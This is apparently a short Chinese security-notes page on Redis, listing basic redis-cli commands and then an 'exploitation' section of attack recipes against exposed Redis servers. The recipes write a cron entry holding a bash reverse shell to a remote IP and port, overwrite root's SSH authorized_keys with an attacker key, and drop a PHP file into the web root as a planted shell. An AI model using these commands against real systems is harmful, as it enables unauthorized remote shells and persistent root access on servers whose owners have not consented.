---
author: YOUZAI
title: 基础知识
date: 2023/05/10
categories:
 - 数据库安全
tags:
 - Redis
---

## 命令

* 连接

```sh
redis-cli -h 127.0.0.1
```

* 查看信息

```sh
>info
```

* 设置变量

```sh
set x "test" # 将变量 x 设置成 test。
```

* 删除数据库

```sh
>flushall
```

* 查看所有键

```sh
KEYS *
```

* 获取默认目录

```sh
CONFIG GET dir
```

* 获取 rdb 文件名

```sh
CONFIG GET dbfilename
```

## 利用

* 计划任务

```sh
redis-cli -h 127.0.0.1
> set x "\n* * * * * bash -i >& /dev/tcp/192.168.63.128/7999 0>&1\n"
> config set dir /var/spool/cron/
> config set dbfilename root
> save
```

* 替换公钥

```sh
ssh-keygen -t rsa # 生成公钥。
> config set dir /root/.ssh/
> config set dbfilename authorized_keys
> set x "\n\n\nssh-rsa {{rsa_key}}\n\n\n"
> save
```

* 写入木马

```sh
> config set dir /var/www/html/
> config set dbfilename shell.php
> set x "<?php phpinfo();?>"
> save
```